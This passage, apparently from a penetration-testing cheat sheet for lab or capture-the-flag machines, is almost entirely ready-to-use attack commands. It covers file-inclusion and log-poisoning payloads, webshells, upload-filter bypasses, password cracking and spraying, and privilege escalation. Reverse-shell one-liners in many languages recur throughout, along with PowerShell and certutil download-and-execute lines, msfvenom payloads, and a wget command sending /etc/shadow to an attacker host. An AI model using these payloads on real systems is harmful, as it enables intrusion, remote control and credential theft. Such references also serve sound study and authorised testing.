[http://10.10.10.x/page.php?file=../../../etc/passwd%00](http://10.10.10.x/page.php?file=../../../etc/passwd%00)  
 
# Double encoding  
 
[http://10.10.10.x/page.php?file=..%252f..%252f..%252fetc%252fpasswd](http://10.10.10.x/page.php?file=..%252f..%252f..%252fetc%252fpasswd)  
 
# UTF-8 encoding  
 
[http://10.10.10.x/page.php?file=..%c0%af..%c0%af..%c0%afetc/passwd](http://10.10.10.x/page.php?file=..%c0%af..%c0%af..%c0%afetc/passwd)  
 
# Path truncation (PHP < 5.3)  
 
[http://10.10.10.x/page.php?file=../../../etc/passwd............[repeated]](http://10.10.10.x/page.php?file=../../../etc/passwd............[repeated])  
 
# Filter bypass  
 
[http://10.10.10.x/page.php?file=....//....//....//etc/passwd](http://10.10.10.x/page.php?file=....//....//....//etc/passwd)  
 
[http://10.10.10.x/page.php?file=..././..././..././etc/passwd](http://10.10.10.x/page.php?file=..././..././..././etc/passwd)  
 
```
 
### PHP Wrappers  
 
#### php://filter (Read source code)  
 
```bash
 
# Base64 encode  
 
[http://10.10.10.x/page.php?file=php://filter/convert.base64-encode/resource=index.php](http://10.10.10.x/page.php?file=php://filter/convert.base64-encode/resource=index.php)  
 
# ROT13  
 
[http://10.10.10.x/page.php?file=php://filter/read=string.rot13/resource=index.php](http://10.10.10.x/page.php?file=php://filter/read=string.rot13/resource=index.php)  
 
# Multiple filters  
 
[http://10.10.10.x/page.php?file=php://filter/convert.base64-encode|convert.base64-decode/resource=index.php](http://10.10.10.x/page.php?file=php://filter/convert.base64-encode%7Cconvert.base64-decode/resource=index.php)  
 
```
 
#### php://input (RCE)  
 
```bash
 
# Requires allow_url_include=On  
 
curl -X POST "[http://10.10.10.x/page.php?file=php://input](http://10.10.10.x/page.php?file=php://input)" --data "<?php system('id'); ?>"  
 
# Reverse shell  
 
curl -X POST "[http://10.10.10.x/page.php?file=php://input](http://10.10.10.x/page.php?file=php://input)" --data "<?php system('nc -e /bin/bash 10.10.14.x 4444'); ?>"  
 
```
 
#### data:// (RCE)  
 
```bash
 
# Requires allow_url_include=On  
 
[http://10.10.10.x/page.php?file=data://text/plain,](http://10.10.10.x/page.php?file=data://text/plain,)<?php system('id'); ?>  
 
[http://10.10.10.x/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==](http://10.10.10.x/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==)  
 
```
 
#### expect:// (RCE)  
 
```bash
 
# Requires expect extension  
 
[http://10.10.10.x/page.php?file=expect://id](http://10.10.10.x/page.php?file=expect://id)  
 
[http://10.10.10.x/page.php?file=expect://ls](http://10.10.10.x/page.php?file=expect://ls)  
 
```
 
### LFI to RCE via Log Poisoning  
 
#### Apache Log Poisoning  
 
```bash
 
# Poison access.log via User-Agent  
 
curl -A "<?php system(\$_GET['cmd']); ?>" [http://10.10.10.x/](http://10.10.10.x/)  
 
# Include poisoned log  
 
[http://10.10.10.x/page.php?file=/var/log/apache2/access.log&cmd=id](http://10.10.10.x/page.php?file=/var/log/apache2/access.log&cmd=id)  
 
# Common Apache log locations  
 
/var/log/apache2/access.log  
 
/var/log/apache/access.log  
 
/var/log/httpd/access_log  
 
/var/log/httpd-access.log  
 
```
 
#### SSH Log Poisoning  
 
```bash
 
# Poison auth.log via SSH  
 
ssh "<?php system(\$_GET['cmd']); ?>"@10.10.10.x  
 
# Include poisoned log  
 
[http://10.10.10.x/page.php?file=/var/log/auth.log&cmd=id](http://10.10.10.x/page.php?file=/var/log/auth.log&cmd=id)  
 
```
 
#### Mail Log Poisoning  
 
```bash
 
# Send email with PHP code  
 
telnet 10.10.10.x 25  
 
MAIL FROM: <?php system($_GET['cmd']); ?>  
 
RCPT TO: user@localhost  
 
# Include mail log  
 
[http://10.10.10.x/page.php?file=/var/log/mail.log&cmd=id](http://10.10.10.x/page.php?file=/var/log/mail.log&cmd=id)  
 
```
 
### LFI to RCE via /proc/self/environ  
 
```bash
 
# Inject PHP code in User-Agent  
 
curl -A "<?php system(\$_GET['cmd']); ?>" "[http://10.10.10.x/page.php?file=/proc/self/environ&cmd=id](http://10.10.10.x/page.php?file=/proc/self/environ&cmd=id)"  
 
```
 
### LFI to RCE via PHP Session Files  
 
```bash
 
# Session files location  
 
/var/lib/php/sessions/sess_[SESSIONID]  
 
/tmp/sess_[SESSIONID]  
 
C:\Windows\Temp\sess_[SESSIONID]  
 
# Inject PHP code in session variable  
 
# Then include session file  
 
[http://10.10.10.x/page.php?file=/var/lib/php/sessions/sess_[SESSIONID]](http://10.10.10.x/page.php?file=/var/lib/php/sessions/sess_[SESSIONID])  
 
```
 
### Remote File Inclusion (RFI)  
 
```bash
 
# Requires allow_url_include=On  
 
[http://10.10.10.x/page.php?file=http://10.10.14.x/shell.php](http://10.10.10.x/page.php?file=http://10.10.14.x/shell.php)  
 
[http://10.10.10.x/page.php?file=http://10.10.14.x/shell.txt](http://10.10.10.x/page.php?file=http://10.10.14.x/shell.txt)  
 
[http://10.10.10.x/page.php?file=\\10.10.14.x\share\shell.php](http://10.10.10.x/page.php?file=%5C%5C10.10.14.x%5Cshare%5Cshell.php) # SMB  
 
# Null byte for extension bypass  
 
[http://10.10.10.x/page.php?file=http://10.10.14.x/shell.txt%00](http://10.10.10.x/page.php?file=http://10.10.14.x/shell.txt%00)  
 
```
 
### Interesting Files to Read  
 
#### Linux  
 
```bash
 
/etc/passwd  
 
/etc/shadow  
 
/etc/hosts  
 
/etc/hostname  
 
/etc/crontab  
 
/etc/apache2/apache2.conf  
 
/etc/apache2/sites-available/000-default.conf  
 
/etc/nginx/nginx.conf  
 
/etc/nginx/sites-available/default  
 
/etc/mysql/my.cnf  
 
/var/log/auth.log  
 
/var/log/apache2/access.log  
 
/var/log/apache2/error.log  
 
/home/user/.ssh/id_rsa  
 
/home/user/.bash_history  
 
/proc/self/environ  
 
/proc/self/cmdline  
 
/proc/self/fd/[0-9]  
 
```
 
#### Windows  
 
```bash
 
C:\Windows\System32\drivers\etc\hosts  
 
C:\Windows\System32\config\SAM  
 
C:\Windows\System32\config\SYSTEM  
 
C:\Windows\repair\SAM  
 
C:\Windows\repair\SYSTEM  
 
C:\inetpub\wwwroot\web.config  
 
C:\xampp\apache\conf\httpd.conf  
 
C:\xampp\apache\logs\access.log  
 
C:\xampp\apache\logs\error.log  
 
C:\xampp\mysql\data\mysql\user.MYD  
 
```
 
### LFI Wordlists  
 
```bash
 
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt  
 
/usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt  
 
/usr/share/wordlists/wfuzz/vulns/dirTraversal-nix.txt  
 
/usr/share/wordlists/wfuzz/vulns/dirTraversal-win.txt  
 
```
 
---  
 
## File Upload Vulnerabilities  
 
### Basic Upload Bypass  
 
#### Extension Bypass  
 
```bash
 
# Case manipulation  
 
.pHp, .pHP5, .PhAr  
 
# Double extensions  
 
.php.jpg, .php.png, .php.gif  
 
# Alternative extensions  
 
.php, .php3, .php4, .php5, .phtml, .phar, .phps, .pht, .pgif, .inc  
 
# Adding valid extension  
 
.php%00.jpg (null byte, older PHP)  
 
.php\x00.jpg  
 
.php%0d%0a.jpg  
 
# Special characters  
 
file.php.....  
 
file.php%20  
 
file.php%0a  
 
file.php%0d%0a  
 
file.php/  
 
file.php.\  
 
file.php....  
 
```
 
#### Content-Type Bypass  
 
```bash
 
# Change Content-Type header  
 
Content-Type: image/jpeg  
 
Content-Type: image/gif  
 
Content-Type: image/png  
 
```
 
#### Magic Bytes  
 
```bash
 
# Add magic bytes to PHP file  
 
# GIF  
 
echo -e 'GIF89a<?php system($_GET["cmd"]); ?>' > shell.php  
 
# JPEG  
 
printf '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]); ?>' > shell.php  
 
# PNG  
 
printf '\x89PNG\r\n\x1a\n<?php system($_GET["cmd"]); ?>' > shell.php  
 
```
 
#### Using ExifTool  
 
```bash
 
# Embed PHP in image metadata  
 
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg  
 
mv image.jpg shell.php.jpg  
 
```
 
### Webshells  
 
#### PHP  
 
```php
 
<?php system($_GET['cmd']); ?>  
 
<?php echo shell_exec($_GET['cmd']); ?>  
 
<?php echo passthru($_GET['cmd']); ?>  
 
<?php echo exec($_GET['cmd']); ?>  
 
<?php $output=shell_exec($_GET['cmd']);echo "<pre>$output</pre>"; ?>  
 
```
 
#### ASP  
 
```asp
 
<%eval request("cmd")%>  
 
```
 
#### ASPX  
 
```aspx
 
<%@ Page Language="C#" %>  
 
<%@ Import Namespace="System.Diagnostics" %>  
 
<script runat="server">  
 
protected void Page_Load(object sender, EventArgs e)  
 
{  
 
string cmd = Request.QueryString["cmd"];  
 
Process p = new Process();  
 
p.StartInfo.FileName = "cmd.exe";  
 
p.StartInfo.Arguments = "/c " + cmd;  
 
p.StartInfo.UseShellExecute = false;  
 
p.StartInfo.RedirectStandardOutput = true;  
 
p.Start();  
 
Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");  
 
}  
 
</script>  
 
```
 
#### JSP  
 
```jsp
 
<%@ page import="java.util.*,java.io.*"%>  
 
<%  
 
String cmd = request.getParameter("cmd");  
 
String[] cmdarr = {"/bin/bash", "-c", cmd};  
 
Process p = Runtime.getRuntime().exec(cmdarr);  
 
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));  
 
String line;  
 
while ((line = br.readLine()) != null) {  
 
out.println(line + "<br>");  
 
}  
 
%>  
 
```
 
### Upload via HTTP PUT  
 
```bash
 
# Check if PUT is allowed  
 
curl -X OPTIONS [http://10.10.10.x/](http://10.10.10.x/) -v  
 
# Upload via PUT  
 
curl -X PUT -d '<?php system($_GET["cmd"]); ?>' [http://10.10.10.x/shell.php](http://10.10.10.x/shell.php)  
 
# Nmap script  
 
nmap -p 80 --script http-put --script-args http-put.url='/shell.php',http-put.file='shell.php' 10.10.10.x  
 
```
 
### WebDAV  
 
```bash
 
# Check for WebDAV  
 
davtest -url [http://10.10.10.x/webdav/](http://10.10.10.x/webdav/)  
 
# Upload with cadaver  
 
cadaver [http://10.10.10.x/webdav/](http://10.10.10.x/webdav/)  
 
put shell.php  
 
# Upload with curl  
 
curl -T shell.php [http://10.10.10.x/webdav/](http://10.10.10.x/webdav/) -u user:password  
 
```
 
---  
 
## Password Attacks  
 
### Hash Identification  
 
```bash
 
# hashid  
 
hashid 'hash_string'  
 
hashid -m 'hash_string' # Show hashcat mode  
 
# hash-identifier  
 
hash-identifier  
 
# Online tools  
 
# [https://hashes.com/en/tools/hash_identifier](https://hashes.com/en/tools/hash_identifier)  
 
```
 
### Hash Cracking  
 
#### Hashcat  
 
```bash
 
# Common hash types  
 
# 0 = MD5  
 
# 100 = SHA1  
 
# 500 = md5crypt  
 
# 1000 = NTLM  
 
# 1800 = sha512crypt  
 
# 3200 = bcrypt  
 
# 5600 = NetNTLMv2  
 
# 13100 = Kerberos TGS-REP (Kerberoasting)  
 
# 18200 = Kerberos AS-REP (ASREPRoast)  
 
# Basic usage  
 
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt  
 
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt --force  
 
# With rules  
 
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule  
 
# Show cracked passwords  
 
hashcat -m 0 hash.txt --show  
 
# Examples  
 
hashcat -m 1000 ntlm_hash.txt /usr/share/wordlists/rockyou.txt  
 
hashcat -m 5600 netntlmv2_hash.txt /usr/share/wordlists/rockyou.txt  
 
hashcat -m 1800 sha512crypt_hash.txt /usr/share/wordlists/rockyou.txt  
 
```
 
#### John the Ripper  
 
```bash
 
# Auto-detect hash type  
 
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
 
# Specify format  
 
john --format=raw-md5 hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
 
john --format=nt hash.txt --wordlist=/usr/share/wordlists/rockyou.txt  
 
# Show cracked passwords  
 
john --show hash.txt  
 
# Extract hashes  
 
# SSH key  
 
ssh2john id_rsa > id_rsa.hash  
 
# ZIP file  
 
zip2john file.zip > file.hash  
 
# /etc/shadow  
 
unshadow passwd shadow > unshadowed.txt  
 
# KeePass database  
 
keepass2john database.kdbx > keepass.hash  
 
# PDF  
 
pdf2john file.pdf > pdf.hash  
 
# Office documents  
 
office2john document.docx > office.hash  
 
```
 
### Online Hash Crackers  
 
```bash
 
# CrackStation  
 
[https://crackstation.net/](https://crackstation.net/)  
 
# Hashes.com  
 
[https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)  
 
# HashKiller  
 
[https://hashkiller.io/listmanager](https://hashkiller.io/listmanager)  
 
```
 
### Protocol Brute Force  
 
#### Hydra  
 
```bash
 
# SSH  
 
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.x  
 
hydra -L users.txt -P passwords.txt ssh://10.10.10.x  
 
# FTP  
 
hydra -l user -P /usr/share/wordlists/rockyou.txt [ftp://10.10.10.x](ftp://10.10.10.x)  
 
# HTTP Basic Auth  
 
hydra -l admin -P /usr/share/wordlists/rockyou.txt http-get://10.10.10.x/admin  
 
# HTTP POST Form  
 
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.x http-post-form "/login.php:user=^USER^&pass=^PASS^:Invalid"  
 
# SMB  
 
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://10.10.10.x  
 
# RDP  
 
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.x  
 
# MySQL  
 
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.10.10.x  
 
# MSSQL  
 
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://10.10.10.x  
 
```
 
#### CrackMapExec  
 
```bash
 
# SMB  
 
crackmapexec smb 10.10.10.x -u user -p passwords.txt  
 
crackmapexec smb 10.10.10.x -u users.txt -p passwords.txt --continue-on-success  
 
# WinRM  
 
crackmapexec winrm 10.10.10.x -u user -p passwords.txt  
 
# SSH  
 
crackmapexec ssh 10.10.10.x -u user -p passwords.txt  
 
```
 
#### Medusa  
 
```bash
 
# SSH  
 
medusa -h 10.10.10.x -u user -P passwords.txt -M ssh  
 
# FTP  
 
medusa -h 10.10.10.x -u user -P passwords.txt -M ftp  
 
```
 
### Password Spraying  
 
```bash
 
# CrackMapExec password spray  
 
crackmapexec smb 10.10.10.x -u users.txt -p 'Summer2023!' --continue-on-success  
 
# Kerbrute (Kerberos)  
 
kerbrute passwordspray -d domain.htb --dc 10.10.10.x users.txt 'Summer2023!'  
 
```
 
### Spray Bash Script

```bash
#!/bin/bash

# Usage: ./spray_hashes.sh <IP_or_CIDR>

TARGET=$1
USER_FILE="names.txt"
HASH_FILE="hashes.txt"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

# 'paste' joins the two files line by line with a colon
# then we loop through each pair
paste -d ':' "$USER_FILE" "$HASH_FILE" | while read -r line; do
    # Split the line into user and hash
    USER=$(echo $line | cut -d':' -f1)
    HASH=$(echo $line | cut -d':' -f2)

    echo "[*] Testing $USER with hash $HASH"
   
    # Run NetExec (nxc) using the NT hash
    nxc smb "$TARGET" -u "$USER" -H "$HASH" --local-auth
done
```
### Custom Wordlist Generation  
 
```bash
 
# Cewl - create wordlist from website  
 
cewl [http://10.10.10.x](http://10.10.10.x) -d 2 -m 5 -w wordlist.txt  
 
cewl [http://10.10.10.x](http://10.10.10.x) --with-numbers -d 2 -m 5 -w wordlist.txt  

# More advanced cewl
cewl -m 5 -d 1 https://example.com -w w.txt && curl -s https://example.com | grep -oE '[0-9]{2,4}' | sort -u > n.txt && awk 'NR==FNR{a[$0];next} {for(i in a) print $0 i}' n.txt w.txt > custom_wordlist.txt && rm w.txt n.txt

# + seasons
cewl -m 5 -d 1 https://example.com -w w.txt && (curl -s https://example.com | grep -oE '[0-9]{2,4}'; printf "Spring\nSummer\nFall\nWinter\nspring\nsummer\nfall\nwinter\n") | sort -u > sfx.txt && awk 'NR==FNR{a[$0];next} {for(i in a) print $0 i}' sfx.txt w.txt > custom_wordlist.txt && rm w.txt sfx.txt

# John mutation rules  
 
john --wordlist=wordlist.txt --rules --stdout > mutated.txt  
 
# Hashcat rules  
 
hashcat -r /usr/share/hashcat/rules/best64.rule --stdout wordlist.txt > mutated.txt  
 
# Remove duplicates  
 
sort wordlist.txt | uniq > clean_wordlist.txt  

# Username anarchy
username-anarchy -i users -f first,flast,first.last,firstl > users.txt
 
```
 
---  
 
## Reverse Shells  
 
### Bash  
 
```bash
 
bash -i >& /dev/tcp/10.10.14.x/4444 0>&1  
 
bash -c 'bash -i >& /dev/tcp/10.10.14.x/4444 0>&1'  
 
exec 5<>/dev/tcp/10.10.14.x/4444; cat <&5 | while read line; do $line 2>&5 >&5; done  
 
```
 
### Netcat  
 
```bash
 
# Traditional  
 
nc -e /bin/bash 10.10.14.x 4444  
 
nc -e /bin/sh 10.10.14.x 4444  
 
# OpenBSD netcat (no -e)  
 
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.x 4444 > /tmp/f  
 
# Alternative  
 
nc -c /bin/bash 10.10.14.x 4444  
 
```
 
### Python  
 
```python
 
# Python 2  
 
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'  
 
# Python 3  
 
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'  
 
```
 
### PHP  
 
```php
 
php -r '$sock=fsockopen("10.10.14.x",4444);exec("/bin/bash -i <&3 >&3 2>&3");'  
 
php -r '$sock=fsockopen("10.10.14.x",4444);shell_exec("/bin/bash -i <&3 >&3 2>&3");'  
 
php -r '$sock=fsockopen("10.10.14.x",4444);system("/bin/bash -i <&3 >&3 2>&3");'  
 
php -r '$sock=fsockopen("10.10.14.x",4444);passthru("/bin/bash -i <&3 >&3 2>&3");'  
 
php -r '$sock=fsockopen("10.10.14.x",4444);popen("/bin/bash -i <&3 >&3 2>&3", "r");'  
 
```
 
### Perl  
 
```perl
 
perl -e 'use Socket;$i="10.10.14.x";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'  
 
```
 
### Ruby  
 
```ruby
 
ruby -rsocket -e 'f=TCPSocket.open("10.10.14.x",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'  
 
```
 
### PowerShell  
 
```powershell
 
# One-liner  
 
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.x',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  
 
# Base64 encoded  
 
powershell -enc <BASE64_ENCODED_COMMAND>  
 
# Using powercat  
 
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.x/powercat.ps1');powercat -c 10.10.14.x -p 4444 -e cmd"  
 
```
 
### Windows Command Line  
 
```cmd
 
# PowerShell download and execute  
 
powershell -c "IEX(New-Object Net.WebClient).DownloadString('[http://10.10.14.x/shell.ps1'](http://10.10.14.x/shell.ps1'))"  
 
# Certutil download and execute  
 
certutil -urlcache -split -f [http://10.10.14.x/nc.exe](http://10.10.14.x/nc.exe) nc.exe && nc.exe 10.10.14.x 4444 -e cmd.exe  
 

```
 
### MSFVenom Payloads  
 
```bash
 
# Linux  
 
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f elf > shell.elf  
 
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f elf > shell.elf  
 
# Windows  
 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f exe > shell.exe  
 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f exe > shell.exe  
 
# Web payloads  
 
msfvenom -p php/reverse_php LHOST=10.10.14.x LPORT=4444 -f raw > shell.php  
 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f asp > shell.asp  
 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f raw > shell.jsp  
 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -f war > shell.war  
 
# Staged vs stageless  
 
# Staged (smaller, requires handler): windows/shell/reverse_tcp  
 
# Stageless (larger, works with netcat): windows/shell_reverse_tcp  
 
# With encoding  
 
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.x LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe > shell.exe  
 
```
 
### Listener Setup  
 
```bash
 
# Netcat  
 
nc -nlvp 4444  
 
rlwrap nc -nlvp 4444 # With readline wrapper  
 
# Socat  
 
socat file:`tty`,raw,echo=0 tcp-listen:4444  
 
# Metasploit  
 
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell_reverse_tcp; set LHOST 10.10.14.x; set LPORT 4444; run"  
 
```
 
---  
 
## Shell Stabilization  
 
### Python PTY  
 
```bash
 
# Spawn PTY  
 
python -c 'import pty; pty.spawn("/bin/bash")'  
 
python3 -c 'import pty; pty.spawn("/bin/bash")'  
 
# Background shell (Ctrl+Z)  
 
# On local machine:  
 
stty raw -echo; fg  
 
# On remote:  
 
reset  
 
export TERM=xterm  
 
export SHELL=bash  
 
```
 
### Full TTY Upgrade  
 
```bash
 
# On remote shell  
 
python3 -c 'import pty; pty.spawn("/bin/bash")'  
 
# Press Ctrl+Z  
 
# On local machine  
 
stty raw -echo  
 
fg  
 
# Press Enter twice  
 
# Back on remote shell  
 
reset  
 
export TERM=xterm-256color  
 
export SHELL=/bin/bash  
 
stty rows 38 columns 116 # Adjust to match local terminal (use 'stty -a' locally)  

# rlwrap (both for linux and windows)

rlwrap nc -nlvp (port)
 
```
 
### Script Method  
 
```bash
 
script /dev/null -c bash  
 
# Ctrl+Z  
 
stty raw -echo; fg  
 
reset  
 
export TERM=xterm  
 
```
 
### Socat (Best Method)  
 
```bash
 
# On attacker (listener)  
 
socat file:`tty`,raw,echo=0 tcp-listen:4444  
 
# On target (reverse shell)  
 
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.x:4444  
 
# If socat not installed, transfer static binary  
 
# Download from: [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)  
 
```
 
### rlwrap  
 
```bash
 
# Use rlwrap for arrow key history  
 
rlwrap nc -nlvp 4444  
 
```
 
---  
 
## Linux Privilege Escalation  
 
### Initial Enumeration  
 
```bash
 
# Current user info  
 
id  
 
whoami  
 
groups  
 
# System info  
 
uname -a  
 
cat /etc/os-release  
 
cat /etc/issue  
 
hostname  
 
# Sudo permissions  
 
sudo -l  
 
# SUID/SGID files  
 
find / -perm -4000 -type f 2>/dev/null  
 
find / -perm -2000 -type f 2>/dev/null  
 
find / -perm -u=s -type f 2>/dev/null  
 
# World-writable files  
 
find / -writable -type d 2>/dev/null  
 
find / -writable -type f 2>/dev/null  
 
# Capabilities  
 
getcap -r / 2>/dev/null  
 
# Cron jobs  
 
cat /etc/crontab  
 
ls -la /etc/cron.*  
 
crontab -l  
 
# Running processes  
 
ps aux  
 
ps -ef  
 
# Network connections  
 
netstat -antup  
 
ss -tulpn  
 
# Installed packages  
 
dpkg -l  
 
rpm -qa  
 
# User accounts  
 
cat /etc/passwd  
 
cat /etc/shadow # If readable  
 
# SSH keys  
 
ls -la /home/*/.ssh/  
 
cat /home/*/.ssh/id_rsa  
 
cat /home/*/.ssh/authorized_keys  
 
# Bash history  
 
cat /home/*/.bash_history  
 
cat ~/.bash_history  
 
# Environment variables  
 
env  
 
printenv  
 
# Kernel version (for kernel exploits)  
 
uname -r  
 
cat /proc/version  
 
```
 
### Sudo Exploitation  
 
#### GTFOBins Reference  
 
```bash
 
# Check GTFOBins for any binary you can run as sudo  
 
# [https://gtfobins.github.io/](https://gtfobins.github.io/)  
 
```
 
#### Common Sudo Exploits  
 
```bash
 
# awk  
 
sudo awk 'BEGIN {system("/bin/bash")}'  
 
# find  
 
sudo find . -exec /bin/bash \; -quit  
 
# vim  
 
sudo vim -c '!bash'  
 
# less/more  
 
sudo less /etc/passwd  
 
!/bin/bash  
 
# nmap (older versions)  
 
sudo nmap --interactive  
 
!bash  
 
# python  
 
sudo python -c 'import os; os.system("/bin/bash")'  
 
# perl  
 
sudo perl -e 'exec "/bin/bash";'  
 
# ruby  
 
sudo ruby -e 'exec "/bin/bash"'  
 
# env  
 
sudo env /bin/bash  
 
# ftp  
 
sudo ftp  
 
!/bin/bash  
 
# mysql  
 
sudo mysql -e '\! /bin/bash'  
 
# apache2  
 
sudo apache2 -f /etc/shadow # Read files  
 
# wget  
 
sudo wget --post-file=/etc/shadow [http://10.10.14.x:8000/](http://10.10.14.x:8000/) # Exfiltrate files  
 
# tar  
 
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash  
 
# zip  
 
sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"  
 
# man  
 
sudo man man  
 
!/bin/bash  
 
# socat  
 
sudo socat stdin exec:/bin/bash  
 
# docker  
 
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash  
 
```
 
#### Sudo without Password (NOPASSWD)  
 
```bash
 
# If sudo -l shows NOPASSWD for any command  
 
sudo /path/to/allowed/command  
 
```
 
#### Sudo LD_PRELOAD  
 
```bash
 
# If 'env_keep' includes LD_PRELOAD  
 
# Check with: sudo -l  
 
# Create malicious shared library  
 
cat > /tmp/shell.c << 'EOF'  
 
#include <stdio.h>  
 
#include <sys/types.h>  
 
#include <stdlib.h>  
 
void _init() {  
 
unsetenv("LD_PRELOAD");  
 
setgid(0);  
 
setuid(0);  
 
system("/bin/bash -p");  
 
}  
 
EOF  
 
# Compile  
 
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so /tmp/shell.c  
 
# Execute  
 
sudo LD_PRELOAD=/tmp/shell.so /path/to/allowed/program  
 
```
 
### SUID/SGID Exploitation  
 
#### Find SUID Binaries  
 
```bash
 
find / -perm -4000 -type f 2>/dev/null  
 
find / -perm -u=s -type f 2>/dev/null  
 
```
 
#### Common SUID Exploits  
 
```bash
 
# Base64  
 
./base64 /etc/shadow | base64 -d  
 
# Bash (with -p flag for SUID)  
 
./bash -p  
 
# Find  
 
./find . -exec /bin/bash -p \; -quit  
 
# cp (copy /etc/passwd)  
 
./cp /etc/passwd /tmp/  
 
# Edit to add root user  
 
echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /tmp/passwd  
 
./cp /tmp/passwd /etc/passwd  
 
# nano/vim  
 
./nano /etc/passwd  
 
./vim /etc/passwd  
 
# python/perl/ruby  
 
./python -c 'import os; os.execl("/bin/bash", "bash", "-p")'  
 
# Nmap (older versions with --interactive)  
 
./nmap --interactive  
 
!bash  
 
```
 
#### Shared Object Injection  
 
```bash
 
# If SUID binary loads a shared library from a writable location  
 
# Use strace to find:  
 
strace /path/to/suid/binary 2>&1 | grep -iE "open|access|no such file"  
 
# Create malicious shared object  
 
cat > /tmp/malicious.c << 'EOF'  
 
#include <stdio.h>  
 
#include <stdlib.h>  
 
static void inject() __attribute__((constructor));  
 
void inject() {  
 
setuid(0);  
 
system("/bin/bash -p");  
 
}  
 
EOF  
 
gcc -shared -fPIC -o /path/to/missing/library.so /tmp/malicious.c  
 
```
 
### Capabilities  
 
```bash
 
# Find binaries with capabilities  
 
getcap -r / 2>/dev/null  
 
# Common capability exploits  
 
# cap_setuid  
 
./python -c 'import os; os.setuid(0); os.system("/bin/bash")'  
 
# cap_dac_read_search (read any file)  
 
./tar -cvf shadow.tar /etc/shadow  
 
tar -xvf shadow.tar  
 
# cap_net_bind_service  
 
# Can bind to privileged ports  
 
# cap_net_raw  
 
# Can capture raw packets  
 
```
 
### Cron Jobs  
 
#### Enumeration  
 
```bash
 
cat /etc/crontab  
 
ls -la /etc/cron.*  
 
crontab -l  
 
cat /var/spool/cron/crontabs/*  
 
# Look for running cron processes  
 
ps aux | grep cron  
 
# Monitor with pspy  
 
./pspy64  
 
```
 
#### Exploitation  
 
```bash
 
# If cron runs script writable by current user  
 
echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1"' >> /path/to/writable/script.sh  
 
# If cron runs with wildcard (tar *, rsync *, etc.)  
 
# Tar wildcard injection  
 
echo "" > "--checkpoint=1"  
 
echo "" > "--checkpoint-action=exec=sh shell.sh"  
 
echo "bash -i >& /dev/tcp/10.10.14.x/4444 0>&1" > shell.sh  
 
# If path in crontab is relative  
 
# Create malicious script in path before legitimate one  
 
```
 
### Writable /etc/passwd  
 
```bash
 
# Check if writable  
 
ls -la /etc/passwd  
 
